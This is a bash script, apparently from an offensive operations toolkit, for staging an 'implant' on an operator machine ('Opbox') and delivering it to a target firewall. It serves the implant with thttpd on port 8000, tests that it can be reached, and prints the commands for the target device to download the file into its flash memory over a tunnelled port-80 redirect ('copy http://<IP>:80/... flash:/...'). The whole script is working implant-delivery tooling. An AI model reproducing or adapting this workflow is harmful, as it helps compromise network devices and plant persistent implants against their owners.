#!/bin/bash
#
# This script is used to configure Apache on your Opbox for FW Ops
#
# Change log: (Please mark changes here)
# 12/15/2010 - Script deployed

echo "*****         Welcome to the Tiny Http Set Up script            *****"
echo "***** Please ensure that your Implant is in /current/bin/FW/OPS *****"

echo -n "What is the name of your implant: "
read _implant

echo -n "What is it named on target (i.e. image.bin pix704.bin): "
read _name

cp /current/bin/FW/OPS/$_implant /current/bin/FW/Tools/thttpd/httptmp/$_name
chmod 666 /current/bin/FW/Tools/thttpd/httptmp/$_name

/current/bin/FW/Tools/thttpd/thttpd -p 8000 -d /current/bin/FW/Tools/thttpd/httptmp -l /current/bin/FW/Tools/thttpd/http.log
echo ""
echo "ls -lart /current/bin/FW/Tools/thttpd/httptmp/"

echo ""
echo "Launching Firefox to test"
echo "" 
firefox http://127.0.0.1:8000/$_name


echo "copy http://<IP>:80/$_name flash:/$_name"
echo "-tunnel"
echo "r 80 127.0.0.1 8000"

echo "To clean up run this:"
echo "killall thttpd"

